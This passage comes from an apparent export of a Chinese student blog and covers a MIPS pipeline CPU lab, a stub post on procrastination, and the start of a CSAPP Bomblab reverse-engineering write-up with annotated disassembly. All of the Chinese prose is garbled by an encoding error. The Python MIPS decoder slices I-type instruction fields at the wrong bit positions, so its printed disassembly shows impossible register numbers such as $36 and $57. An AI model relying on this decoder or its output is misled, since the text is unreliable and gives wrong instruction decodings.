çš„ç»„åˆæ‰€å¯¹åº”çš„å«ä¹‰ï¼ŒæŒ‡ä»¤é›†è§„å®š0å’Œ1çš„ç»„åˆæ‰€å¯¹åº”çš„å¯„å­˜å™¨ï¼ŒALUçš„å„ç§ä¿¡å·ã€‚MIPSæŒ‡ä»¤é›†ä»å±äºRISCç³»åˆ—ï¼Œæœ€åŸºæœ¬çš„æŒ‡ä»¤æœ‰31æ¡ã€‚\n//è®²åˆ°è¿™é‡Œæœ¬åº”è¯¥æ‰“ä¸ªè¡¨å±•ç¤º31æ¡æŒ‡ä»¤ï¼Œä½†æ˜¯ğŸ‘´æ‡’å¾—æ‰“äº†ã€‚\nVivadoä¸­ï¼Œ.coeæ–‡ä»¶ç”¨äºåˆå§‹åŒ–IPæ ¸ï¼Œæœ¬å®éªŒç»™å‡ºçš„.coeæ–‡ä»¶ä¸­å­˜æ”¾äº†å‡ æ¡æŒ‡ä»¤ï¼Œä¸è¿‡æ˜¯16è¿›åˆ¶æ•°å­—ï¼Œå†™ä¸ªå°è„šæœ¬æ‰“å°æˆå¯è¯»çš„å½¢å¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 # mips_dump.py with open(path,\u0026#39;r\u0026#39;) as f: hex_list = f.read().split(\u0026#39;\\n\u0026#39;) bin_list = list(map(lambda x:bin(int(x,16)),hex_list)) # bin_code_list = [\u0026#34;{:0\u0026gt;32}\u0026#34;.format(i[2:],\u0026#39;b\u0026#39;) for i in bin_list] bin_code_list = [i[2:].zfill(32) for i in bin_list] IType_op_dict = { \u0026#39;001000\u0026#39;:\u0026#39;addi\u0026#39;, \u0026#39;001001\u0026#39;:\u0026#39;addiu\u0026#39;, \u0026#39;001100\u0026#39;:\u0026#39;ori\u0026#39;, \u0026#39;001101\u0026#39;:\u0026#39;xori\u0026#39;, \u0026#39;001111\u0026#39;:\u0026#39;lui\u0026#39;, \u0026#39;100011\u0026#39;:\u0026#39;lw\u0026#39;, \u0026#39;101011\u0026#39;:\u0026#39;sw\u0026#39;, \u0026#39;000100\u0026#39;:\u0026#39;beq\u0026#39;, \u0026#39;000101\u0026#39;:\u0026#39;bne\u0026#39;, \u0026#39;001010\u0026#39;:\u0026#39;slti\u0026#39;, \u0026#39;001011\u0026#39;:\u0026#39;sltiu\u0026#39; } RType_func_dict = { \u0026#39;100000\u0026#39;:\u0026#39;add\u0026#39;, \u0026#39;100001\u0026#39;:\u0026#39;addu\u0026#39;, \u0026#39;100010\u0026#39;:\u0026#39;sub\u0026#39;, \u0026#39;100011\u0026#39;:\u0026#39;subu\u0026#39;, \u0026#39;100100\u0026#39;:\u0026#39;and\u0026#39;, \u0026#39;100101\u0026#39;:\u0026#39;or\u0026#39;, \u0026#39;100110\u0026#39;:\u0026#39;xor\u0026#39;, \u0026#39;100111\u0026#39;:\u0026#39;nor\u0026#39;, \u0026#39;101010\u0026#39;:\u0026#39;slt\u0026#39;, \u0026#39;101011\u0026#39;:\u0026#39;sltu\u0026#39;, \u0026#39;000000\u0026#39;:\u0026#39;sll\u0026#39;, \u0026#39;000010\u0026#39;:\u0026#39;srl\u0026#39;, \u0026#39;000011\u0026#39;:\u0026#39;sra\u0026#39;, \u0026#39;000100\u0026#39;:\u0026#39;sllv\u0026#39;, \u0026#39;000110\u0026#39;:\u0026#39;srlv\u0026#39;, \u0026#39;000111\u0026#39;:\u0026#39;srav\u0026#39;, \u0026#39;001000\u0026#39;:\u0026#39;jr\u0026#39;, } def f_hex(ori, width): # bin-\u0026gt;hex return \u0026#34;0x\u0026#34;+hex(int(ori,2))[2:].zfill(width) def f_reg(ori): # print register num return \u0026#34;$\u0026#34;+str(int(ori,2)).zfill(2) def code_dump(type:str,inst:str,params:list): if type == \u0026#39;R\u0026#39;: s = inst.ljust(6) + \u0026#34;, \u0026#34;.join([f_reg(params[0]),f_reg(params[1]),f_reg(params[2]),f_hex(params[3],2)]) elif type == \u0026#39;I\u0026#39;: s = inst.ljust(6) + \u0026#34;, \u0026#34;.join([f_reg(params[0]),f_reg(params[1]),f_hex(params[2],8)]) else: s = inst.ljust(6) +\u0026#39;0x\u0026#39;+ hex(int(params[0],2))[2:].zfill(8) return s assembly_list = [] for _ in bin_code_list: op = _[:6] # public field try: if op == \u0026#39;000000\u0026#39;: # R-Type rs = _[6:11] rt = _[11:16] rd = _[16:21] shamt = _[21:26] func = _[26:] assembly_list.append(code_dump(\u0026#39;R\u0026#39;,RType_func_dict[func],[rs,rt,rd,shamt])) elif op in [\u0026#39;000010\u0026#39;, \u0026#39;000011\u0026#39;]: # J-Type target = _[6:] assembly_list.append(code_dump(\u0026#39;J\u0026#39;,\u0026#39;j\u0026#39;,[target])) else: # I-Type rs = _[6:12] rt = _[12:18] imm = _[18:] assembly_list.append(code_dump(\u0026#39;I\u0026#39;,IType_op_dict[op],[rs, rt, imm])) except Exception as e: assembly_list.append(\u0026#34;***** decode error! *****\u0026#34;) head = \u0026#34;+---hexdump----|--------- assembly ---------+\u0026#34; print(head) addr = 0 for i in range(len(bin_code_list)): print(\u0026#34;|\u0026#34;+ f_hex(bin(addr),2) +\u0026#34; \u0026#34;+ hex_list[i] +\u0026#34; | \u0026#34;+ assembly_list[i].ljust(26) + \u0026#34; |\u0026#34;) addr += 4 tail = \u0026#34;+\u0026#34;+\u0026#34;-\u0026#34;*43+\u0026#34;+\u0026#34; print(tail) æ‰“å°å‡ºæ¥ğŸ‘´å‚»äº†ï¼Œæ€ä¹ˆè¿˜æœ‰ä¸åœ¨31æ¡èŒƒå›´é‡Œçš„ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 +---hexdump----|--------- assembly ---------+ |0x00 24010001 | addiu $00, $04, 0x00000001 | |0x04 00011100 | sll $00, $01, $02, 0x04 | |0x08 00411821 | addu $02, $01, $03, 0x00 | |0x0c 00022082 | srl $00, $02, $04, 0x02 | |0x10 28990005 | slti $09, $36, 0x00000005 | |0x14 07210010 | ***** decode error! ***** | |0x18 00642823 | subu $03, $04, $05, 0x00 | |0x1c AC050014 | sw $00, $20, 0x00000014 | |0x20 00A23027 | nor $05, $02, $06, 0x00 | |0x24 00C33825 | or $06, $03, $07, 0x00 | |0x28 00E64026 | xor $07, $06, $08, 0x00 | |0x2c AC08001C | sw $00, $32, 0x0000001c | |0x30 11030002 | beq $16, $12, 0x00000002 | |0x34 00C7482A | slt $06, $07, $09, 0x00 | |0x38 24010008 | addiu $00, $04, 0x00000008 | |0x3c 8C2A0014 | lw $02, $40, 0x00000014 | |0x40 15450004 | bne $20, $20, 0x00000004 | |0x44 00415824 | and $02, $01, $11, 0x00 | |0x48 AC2B001C | sw $02, $44, 0x0000001c | |0x4c AC240010 | sw $02, $16, 0x00000010 | |0x50 0C000019 | j 0x00000019 | |0x54 3C0C000C | lui $00, $48, 0x0000000c | |0x58 004CD007 | srav $02, $12, $26, 0x00 | |0x5c 003AD804 | sllv $01, $26, $27, 0x00 | |0x60 0360F809 | ***** decode error! ***** | |0x64 A07A0005 | ***** decode error! ***** | |0x68 0063682B | sltu $03, $03, $13, 0x00 | |0x6c 1DA00003 | ***** decode error! ***** | |0x70 00867004 | sllv $04, $06, $14, 0x00 | |0x74 000E7883 | sra $00, $14, $15, 0x02 | |0x78 002F8006 | srlv $01, $15, $16, 0x00 | |0x7c 1A000008 | ***** decode error! ***** | |0x80 002F8007 | srav $01, $15, $16, 0x00 | |0x84 240B008C | addiu $00, $44, 0x0000008c | |0x88 06000006 | ***** decode error! ***** | |0x8c 8D5C0003 | lw $21, $48, 0x00000003 | |0x90 179D0007 | bne $57, $52, 0x00000007 | |0x94 A0AF0008 | ***** decode error! ***** | |0x98 80B20008 | ***** decode error! ***** | |0x9c 90B30008 | ***** decode error! ***** | |0xa0 2DF8FFFF | sltiu $31, $35, 0x00003fff | |0xa4 0185E825 | or $12, $05, $29, 0x00 | |0xa8 01600008 | jr $11, $00, $00, 0x00 | |0xac 31F4FFFF | ori $31, $19, 0x00003fff | |0xb0 35F5FFFF | xori $31, $23, 0x00003fff | |0xb4 39F6FFFF | ***** decode error! ***** | |0xb8 08000000 | j 0x00000000 | +-------------------------------------------+ æ€»ä¹‹ï¼Œä»£ç éƒ½ç»™ä½ äº†ï¼Œä¸‹é¢ç»™å‡ºä¸€ä¸ªvivadoå®éªŒçš„å®Œæ•´æµç¨‹ï¼Œä¸å…¨é¢ï¼Œä½†æ˜¯éƒ½æ˜¯è¸©å‘ç»éªŒã€‚\nğŸ†’Vivadoä½¿ç”¨ æœ¬æµç¨‹ç¯å¢ƒï¼šVivado 2020.2\nå¼€å‘æ¿å‹å·ï¼šLS-CPU-EXB-1\nåˆ›å»ºé¡¹ç›® ä¸‹ä¸€æ­¥ï¼Œä¸‹ä¸€æ­¥ï¼Œä¸‹ä¸€æ­¥ï¼Œï¼Œï¼Œç¡®è®¤ã€‚ è¿™ä¸€æ­¥åªéœ€è¦æ³¨æ„é€‰å™¨ä»¶ï¼Œä¸€å®šè¦é€‰å¯¹ã€‚å¦åˆ™æœ‰å¯èƒ½åœ¨Implementationé‡åˆ°â€œç«¯å£ç”µå¹³ä¸åŒ¹é…â€â€œç«¯å£æ•°é‡ä¸è¶³â€ç­‰ç¡¬ä»¶é—®é¢˜ã€‚å½“ç„¶ï¼Œæœ‰å¯èƒ½å‹å·ç›¸è¿‘çš„æ€§èƒ½è§„æ ¼ä¹Ÿå·®ä¸å¤šï¼Œè¿™å±äºç„å­¦é—®é¢˜äº†ã€‚å®éªŒä¹¦ä¸Šé€‰æ‹©çš„çš„å‹å·åº”è¯¥æ˜¯â€œxc7a200tfbg676-2â€ï¼Œä½†æ˜¯ğŸ‘´ç”¨çš„æ˜¯â€œxc7a200tfbv676-2â€ä¹Ÿèƒ½æˆåŠŸå†™å…¥æ¯”ç‰¹æµã€‚\nç¼–å†™ä»£ç å¹¶ä»¿çœŸ æœ¬å®éªŒçš„ä»£ç å¤§å¤šæ¥è‡ªâ€œ2016-04-14â€ï¼Œé‚£å°±æ˜¯é¾™èŠ¯å…¬å¸ç»™çš„æºä»£ç ã€‚åœ¨è¯¥ç³»åˆ—ä»£ç ä¸­æœ‰ä¸€å¤„bugï¼Œä½äºâ€œå•å‘¨æœŸCPUå®éªŒâ€çš„single_cycle_cpu.vä¸­ã€‚214è¡Œï¼Œresetnåº”è¯¥ä¸º{4{resetn}}ï¼Œå†™ä½¿èƒ½ä½å®½åº”ä¸ºä¸º4ã€‚ ä¸‹é¢è®²è§£ä¸€ä¸‹é¡¹ç›®ç»“æ„ï¼Œæ‰€æœ‰å®éªŒéƒ½æ˜¯ç±»ä¼¼çš„ï¼š ä¸‰ä¸ªé¡¶å±‚æ–‡ä»¶å¤¹åˆ†åˆ«å¯¹åº”Add Sourceé‡Œçš„ä¸‰ç±»æºæ–‡ä»¶ï¼šæ·»åŠ è®¾è®¡ï¼Œæ·»åŠ ä»¿çœŸï¼Œæ·»åŠ çº¦æŸã€‚å¦‚æœä¸éœ€è¦ä¸Šæ¿ï¼Œåªå®Œæˆä»¿çœŸï¼Œé‚£ä¹ˆåªéœ€è¦æ·»åŠ è®¾è®¡ï¼ˆå‡ ä¸ª.vï¼‰ï¼Œæ·»åŠ ä»¿çœŸï¼ˆtestbench.v/tb.vï¼‰å°±è¶³å¤Ÿäº†ï¼Œxxx_display.vä¹Ÿæ˜¯ä¸Šæ¿éœ€è¦çš„æ•…è€Œå¯ä»¥å¿½ç•¥ã€‚ï¼ˆå®é™…ä¸Šï¼Œå›¾ä¸­æˆ‘ç”¨ç®­å¤´æ ‡è®°çš„éƒ½ç”¨ä¸åˆ°ï¼‰ã€‚\nç¼–å†™tbï¼Œæ— éæ˜¯ç»™tbé‡Œå£°æ˜ä¸ºinputçš„ä¿¡å·èµ‹å€¼ï¼Œè¿˜å¯ä»¥ä½¿ç”¨#xxï¼Œè®©tbç­‰å¾…ä¸€æ®µæ—¶é—´ã€‚\nç‚¹å‡»Run Simulationï¼Œç­‰ä¸€ä¼šå°±èƒ½çœ‹åˆ°æ³¢å½¢å›¾ã€‚æ³¢å½¢å›¾æœ‰ä¸‰ç§é¢œè‰²ï¼š\nç»¿è‰²ä»£è¡¨ä¿¡å·æ­£å¸¸æ­£å¸¸ï¼› çº¢è‰²çš„Xä»£è¡¨ä¿¡å·ä¸ç¡®å®šï¼› è“è‰²çš„Zä»£è¡¨ä¿¡å·ä¼‘çœ ã€‚ ä¸€èˆ¬é‡åˆ°çº¢Xï¼Œéƒ½æ˜¯æœªåˆå§‹åŒ–é—®é¢˜ã€‚è“Zå¤§æ¦‚æ˜¯æ²¡æœ‰æ¨¡å—è°ƒç”¨è¿™äº›ä¿¡å·ã€‚Vivadoæ³¢å½¢å›¾çš„æ“ä½œæå…¶éš¾ç”¨ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸ªç›¸å¯¹å¥½ç”¨çš„æ“ä½œï¼šå·¦é”®ä»å·¦å‘å³æ°´å¹³åˆ’ï¼Œä¼šç›´æ¥ç¼©æ”¾åˆ°é¼ æ ‡æ»‘è¿‡çš„è¿™ä¸€æ®µã€‚å³é”®é€‰æ‹©è¿›åˆ¶ç­‰æ“ä½œç•¥ã€‚\nä»¿çœŸéœ€è¦æ³¨æ„çš„é—®é¢˜ï¼š\nå¦‚æœæ–‡ä»¶æ²¡é—®é¢˜ï¼Œæ¨¡å—è°ƒç”¨å±‚æ¬¡ä¼šè¢«è‡ªåŠ¨è§£æä»è€Œå‘ˆç°æˆä¸€æ£µæ ‘ï¼Œè€Œä¸æ˜¯å¥½å‡ ä¸ªé¡¶å±‚æ–‡ä»¶ã€‚ æ³¨æ„set as topï¼Œåº”è¯¥è®¾ä¸ºæ ¹éƒ¨æ¨¡å—ï¼ˆè°ƒç”¨å…¶ä»–æ¨¡å—çš„ï¼‰å’Œtb //å¦‚æœè®¾é”™äº†å¯èƒ½åœ¨Implementationä¼šå‡ºç°â€œç«¯å£æœªèµ‹åˆå€¼â€çš„æŠ¥é”™ã€‚ ä¸­æ–‡ä¹±ç æ˜¯ç»å…¸å­—ç¬¦é›†é—®é¢˜ï¼Œæœ‰å¯èƒ½åœ¨æ¢è¡Œå¤„å¯¼è‡´è¯­æ³•é”™è¯¯ã€‚å»ºè®®ç»Ÿä¸€æ¢æˆutf-8ã€‚ ç®€å•è§£å†³æ–¹æ³•ï¼šä»vscodeé‡Œå¤åˆ¶ã€‚ å¼•å…¥IPæ ¸ å¯¹äºæµæ°´çº¿CPUï¼Œdata_ramå’Œinst_roméœ€è¦åŒæ­¥å†™ï¼Œè‡ªå·±å®ç°æ¯”è¾ƒå¤æ‚ï¼Œæ•…ç›´æ¥å®ä¾‹åŒ–å°è£…å¥½çš„å†…å­˜å—IPã€‚å¦‚ä½•å¼•å…¥ï¼Ÿé¦–å…ˆè¯´æ˜å‡ ç§æ–‡ä»¶æ ¼å¼ï¼š\n.dcp åŸæ„ä¸ºcheckpointsæ–‡ä»¶ï¼Œæ˜¯ä¸€ç§åŠ å¯†å‹ç¼©æ–‡ä»¶ã€‚ç”¨äºå°è£…æ¨¡å—æ–¹ä¾¿è°ƒç”¨ï¼Œä½†å¯¹ç‰ˆæœ¬è¦æ±‚æå…¶æ•æ„Ÿã€‚ .xci/.xcix IPæ ¸é…ç½®æ–‡ä»¶ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªxmlã€‚æ˜¯Vivadoåœ¨æ–°ç‰ˆæœ¬æå€¡ä½¿ç”¨xciè€Œä¸æ˜¯dcpã€‚ .xdc ç®¡è„šçº¦æŸæ–‡ä»¶ã€‚åœ¨Implementationç”¨åˆ°ï¼Œæ­¤å¤„æŒ‰ä¸‹ä¸è¡¨ã€‚ è¿™å‡ ç§æ–‡ä»¶æ ¼å¼éƒ½æ˜¯å¯ä»¥ç›´æ¥Add Sourceæ·»åŠ è¿›æ¥çš„ã€‚å®éªŒè€å¸ˆåŒæ—¶æä¾›dcpå’Œxciæ–‡ä»¶ï¼Œæ·»åŠ dcpå´©å±äº†ï¼ŒåŸå› ä¼°è®¡å¦‚ä¸Šã€‚æ·»åŠ xciä¹‹åï¼Œæç¤ºæˆ‘å°†IPæ›´æ–°ä¸ºcore cointainerçš„å½¢å¼\næ›´æ–°å°±å®Œäº†ã€‚ç„¶åéœ€è¦ç­‰ä¸€ä¼šï¼ŒIPè¿˜è¦æ‰§è¡Œä¸€æ­¥synthï¼Œè¿™æ®µæ—¶é—´é‡ŒIPå±äºé”ä½çš„çŠ¶æ€ï¼Œä¸èƒ½ä¿®æ”¹é…ç½®ã€‚\næ³¨æ„æ›´æ¢å™¨ä»¶åï¼ŒIPæ ¸éƒ½ä¼šé”ä½ã€‚è¿™è¡¨ç¤ºIPçš„é…ç½®å’Œå½“å‰ç¯å¢ƒä¸åŒ¹é…ã€‚å¯¹æ‰€æœ‰IPé”ä½çš„é—®é¢˜ï¼Œåªéœ€è¦ç‚¹å‡»èœå•æ Reportsâ†’Reports IP Statusï¼Œç„¶åç‚¹upgradeå³å¯è§£é™¤é”å®šã€‚\næˆ‘ç›´æ¥ä¸Šæ¿ ç›´æ¥ç‚¹ç”Ÿæˆæ¯”ç‰¹æµï¼Œä¼šä¸€æ­¥æ­¥çš„æŒ‰å·¥ä½œæµå‘ä¸‹è¿è¡Œï¼Œç­‰å¾…å‡ åˆ†é’Ÿå°±èƒ½æ„‰å¿«çš„æ”¶è·ä½ çš„æŠ¥é”™äº†ï¼\nåœ¨æŠŠä¸Šæ–‡æåˆ°çš„å‘éƒ½è¸©è¿‡ä¸€éä¹‹åï¼Œç»ˆäºæ²¡æœ‰critical warningï¼Œæ³ªç›®ã€‚\nä½†æ˜¯æ­¤æ—¶å®éªŒè¯¾å·²ç»ç»“æŸäº†ï¼ŒğŸ‘´å·æºœåˆ°æ²¡äººçš„å®éªŒå®¤ï¼Œå¹¶ç•™ä¸‹ä»¥ä¸‹çè´µç”»é¢\nç„¶åğŸ‘´å‘ç°data_ramå†™å…¥å¤±è´¥ã€‚ä½†æ˜¯ğŸ‘´æ²¡æ—¶é—´æäº†ï¼ŒğŸ‘´è¿˜æ˜¯æ»šå»å¤ä¹ è¯¾æœ¬å§ã€‚\nğŸ—¿å¤šå‘¨æœŸæµæ°´çº¿CPUåŸç† æœ€åï¼Œç»§ç»­å¤ä¹ è®¡ç»„ã€‚\n","date":"2021-06-09T17:14:19Z","image":"https://lonelyuan.github.io/p/%E5%9F%BA%E4%BA%8Evivado%E7%9A%84%E5%9F%BA%E4%BA%8Efpga%E7%9A%84%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8Emips%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BA%94%E7%BA%A7%E6%B5%81%E6%B0%B4%E7%BA%BFcpu%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%B3%A8%E9%87%8A/mips_pipeline_cpu_hu41671eab994e10b990ecc8a898c73896_308650_120x120_fill_q75_box_smart1.jfif","permalink":"https://lonelyuan.github.io/p/%E5%9F%BA%E4%BA%8Evivado%E7%9A%84%E5%9F%BA%E4%BA%8Efpga%E7%9A%84%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8Emips%E7%9A%84%E4%B8%80%E7%A7%8D%E4%BA%94%E7%BA%A7%E6%B5%81%E6%B0%B4%E7%BA%BFcpu%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%B3%A8%E9%87%8A/","title":"åŸºäºvivadoçš„åŸºäºFPGAçš„ä¸€ç§åŸºäºMIPSçš„ä¸€ç§äº”çº§æµæ°´çº¿CPUå®ç°çš„æ³¨é‡Š"},{"content":"// ç¬‘æ­»ï¼Œæ ¹æœ¬èµ¢ä¸äº†ã€‚å—ä¸é¸Ÿï¼Œç›´æ¥æŠ•é™~\n0x01 | æ‹–å»¶ç—‡çš„ç”Ÿç†åŸºç¡€\n0x02 | å¯¹æ‹–å»¶ç—‡çš„æ–¹æ³•è®ºç»¼è¿°\n0x03 | è¥¿è¥¿å¼—æ–¯è®¡åˆ’\n","date":"2021-04-15T23:01:29Z","image":"https://lonelyuan.github.io/p/%E6%88%91%E5%92%8C%E6%8B%96%E5%BB%B6%E7%97%87%E7%9A%84%E6%88%98%E4%BA%89/ProcrastinationWar_hu0b75bf0afc945e74174c5a743bf06a5b_26480_120x120_fill_q75_box_smart1.jfif","permalink":"https://lonelyuan.github.io/p/%E6%88%91%E5%92%8C%E6%8B%96%E5%BB%B6%E7%97%87%E7%9A%84%E6%88%98%E4%BA%89/","title":"æˆ‘å’Œæ‹–å»¶ç—‡çš„æˆ˜äº‰"},{"content":"CSAPPï¼šBomblab é€†å‘çš„ä¼ ç»Ÿè‰ºèƒ½æ‹†ç‚¸å¼¹ï¼ŒğŸ‘´çš„é’æ˜¥å›æ¥äº†ã€‚\næ–‡ä»¶ç»“æ„ï¼š\n1 2 3 4 bomb â”œâ”€â”€ README â”œâ”€â”€ bomb â””â”€â”€ bomb.c åªæœ‰ä¸€ä¸ªç¨‹åºï¼Œç»™çš„æºç åŸºæœ¬æ²¡ç”¨ï¼Œæˆ‘ä»¬è¦ç”¨é€†å‘å·¥ç¨‹çš„æ–¹æ³•ç†è§£ç¨‹åºï¼Œæ‰¾åˆ°æ­£ç¡®çš„å­—ç¬¦ä¸²ã€‚\nè®²åæ±‡ç¼–å™¨çš„ç»“æœå¯¼å‡ºï¼šobjdump -d bomb \u0026gt; bomb.txt\nå¯ä»¥çœ‹åˆ°æœ‰6å…³ï¼Œæ¯ä¸€å…³æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè‹¥è·³è½¬åˆ°explode_bombå‡½æ•°ï¼Œåˆ™ç­”æ¡ˆé”™è¯¯ã€‚\nç¬¬ä¸€å…³ï¼šå­—ç¬¦ä¸²æ¯”è¾ƒ 1 2 3 4 0000000000400ee0 \u0026lt;phase_1\u0026gt;: 400ee0:\t48 83 ec 08 sub $0x8,%rsp 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi 400ee9:\te8 4a 04 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; é€»è¾‘æ˜¯ç›´æ¥æ¯”è¾ƒå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œä¸è¿‡$0x402400ä¸æ˜¯ç¨‹åºå†…åœ°å€ï¼Œè¯´æ˜ç­”æ¡ˆè¢«è—åœ¨äº†æˆ‘ä»¬çœ‹ä¸åˆ°çš„å†…å­˜ä½ç½®ã€‚\näºæ˜¯ä¸ŠGDBï¼Œåœ¨\u0026lt;phase_1\u0026gt;ä¸‹æ–­ç‚¹ï¼Œstepiå•æ­¥æ‰§è¡Œåˆ°callqä¹‹å‰ï¼ŒæŸ¥çœ‹å¯„å­˜å™¨:x\\s $esiï¼Œå¾—åˆ°ç­”æ¡ˆã€‚ï¼ˆæ¯å°ç”µè„‘çš„ç­”æ¡ˆéƒ½ä¸ä¸€æ ·ï¼‰\nç¬¬äºŒå…³ï¼šå¾ªç¯ 1 2 3 4 5 6 0000000000400efc \u0026lt;phase_2\u0026gt;: 400efc:\t55 push %rbp //å‹æ ˆ 400efd:\t53 push %rbx 400efe:\t48 83 ec 28 sub $0x28,%rsp //å¼€è¾Ÿæ ˆå¸§ 400f02:\t48 89 e6 mov %rsp,%rsi//æ ˆé¡¶åœ°å€â†’rsiå‚æ•°äºŒ 400f05:\te8 52 05 00 00 callq 40145c \u0026lt;read_six_numbers\u0026gt; å¦‚å‡½æ•°åæ‰€ç¤ºï¼Œè¯»6ä¸ªæ•°å­—ï¼Œä¸ºä»€ä¹ˆæ˜¯6å‘¢ï¼Œå¤§æ¦‚æ˜¯å› ä¸ºå­˜æ”¾å‚æ•°çš„å¯„å­˜å™¨æ€»å…±æœ‰6ä¸ªå§ã€‚ï¼ˆç„¶è€Œå¹¶ä¸ï¼‰\nå¯ä»¥çœ‹åˆ°è°ƒç”¨å‰å¼€è¾Ÿäº†0x28çš„æ ˆä¸Šç©ºé—´ï¼Œè¶³å¤Ÿå­˜æ”¾6ä¸ªæ•´æ•°ã€‚æ ˆé¡¶åœ°å€è¢«å­˜å…¥%rsiï¼Œä»¥æ­¤ä¼ é€’è¯¥åœ°å€ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 000000000040145c \u0026lt;read_six_numbers\u0026gt;: //%rsi:çˆ¶è¿›ç¨‹\u0026lt;phase_2\u0026gt;çš„æ ˆé¡¶åœ°å€ 40145c:\t48 83 ec 18 sub $0x18,%rsp //æ ˆå¸§é•¿24 401460:\t48 89 f2 mov %rsi,%rdx //rsiâ†’å‚æ•°ä¸‰ï¼šnum1 401463:\t48 8d 4e 04 lea 0x4(%rsi),%rcx //rsi+4â†’å‚æ•°å››ï¼šnum2 401467:\t48 8d 46 14 lea 0x14(%rsi),%rax //rsi+20â†’rax 40146b:\t48 89 44 24 08 mov %rax,0x8(%rsp) //raxâ†’æ ˆé¡¶+8ï¼šnum6 401470:\t48 8d 46 10 lea 0x10(%rsi),%rax //rsi+16â†’rax 401474:\t48 89 04 24 mov %rax,(%rsp) //raxâ†’æ ˆé¡¶ï¼šnum5 401478:\t4c 8d 4e 0c lea 0xc(%rsi),%r9 //rsi+12â†’å‚æ•°å…­ï¼šnum4 40147c:\t4c 8d 46 08 lea 0x8(%rsi),%r8 //rsi+8â†’å‚æ•°äº”ï¼šnum3 401480:\tbe c3 25 40 00 mov $0x4025c3,%esi//0x4025c3:\u0026#34;%d %d %d %d %d %d\u0026#34; 401485:\tb8 00 00 00 00 mov $0x0,%eax //è¿”å›å€¼èµ‹0 40148a:\te8 61 f7 ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; //sscanf() 40148f:\t83 f8 05 cmp $0x5,%eax //è¿”å›å€¼å’Œ5æ¯”è¾ƒï¼Œå³è¾“å…¥6ä¸ªå€¼æ‰èƒ½é€šè¿‡ 401492:\t7f 05 jg 401499 \u0026lt;read_six_numbers+0x3d\u0026gt; 401494:\te8 a1 ff ff ff callq 40143a \u0026lt;explode_bomb\u0026gt; 401499:\t48 83 c4 18 add $0x18,%rsp //å‡ºæ ˆ 40149d:\tc3 retq çœ‹\u0026lt;read_six_numbers\u0026gt;ï¼Œ%rsiä¸­çš„åœ°å€ä»¥4ä¸ºæ­¥é•¿è¢«åˆ†åˆ«å‚¨å­˜ã€‚çŒœæµ‹sscanfå‡½æ•°çš„è¿”å›å€¼ä¸­ï¼Œç¬¬ä¸€ä¸ªè¡¨ç¤ºè¾“å…¥å‚æ•°çš„ä¸ªæ•°ï¼›ç¨‹åºè¦æ±‚6ä¸ªè¾“å…¥ï¼ŒåŠ ä¸Šrsiè¢«å ç”¨ï¼Œäºæ˜¯å¤šçš„ä¸¤ä¸ªå­˜å…¥æ ˆä¸­ã€‚ä¸”sscanfå‡½æ•°çš„è¿”å›å€¼æŒ‰å‚æ•°å¯„å­˜å™¨ï¼ˆå¤šçš„åœ°å€åœ¨æ ˆä¸Šï¼‰å­˜æ”¾çš„åœ°å€ä¼ è¾“ï¼Œå³è¾“å…¥å€¼è¢«æŒ‰é¡ºåºå­˜å…¥phase_2çš„æ ˆå¸§ä¸­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) //æ ˆé¡¶ä½ç½®å–åŒå­—å’Œ1æ¯”è¾ƒ 400f0e:\t74 20 je 400f30 \u0026lt;phase_2+0x34\u0026gt; 400f10:\te8 25 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400f17:\t8b 43 fc mov -0x4(%rbx),%eax //å¾ªç¯å¤´ï¼šnum1â†’eax 400f1a:\t01 c0 add %eax,%eax // eax*2 400f1c:\t39 03 cmp %eax,(%rbx) //å’Œnum2æ¯”è¾ƒ 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt; //ç›¸ç­‰æ‰é€šè¿‡ 400f20:\te8 15 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400f25:\t48 83 c3 04 add $0x4,%rbx //rbxå¢4 400f29:\t48 39 eb cmp %rbp,%rbx //rbxå’Œrsp+24æ¯”è¾ƒï¼Œç›¸ç­‰åˆ™è·³å‡º 400f2c:\t75 e9 jne 400f17 \u0026lt;phase_2+0x1b\u0026gt; //å¾ªç¯å°¾ï¼Œå¾ªç¯å…±6è½® 400f2e:\teb 0c jmp 400f3c \u0026lt;phase_2+0x40\u0026gt; 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx //num2åœ°å€â†’rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp//rbxåœ°å€â†’rbp 400f3a:\teb db jmp 400f17 \u0026lt;phase_2+0x1b\u0026gt; //å¼€å§‹å¾ªç¯ è·³å‡º\u0026lt;read_six_numbers\u0026gt;åï¼Œé¦–å…ˆæ£€æŸ¥æ 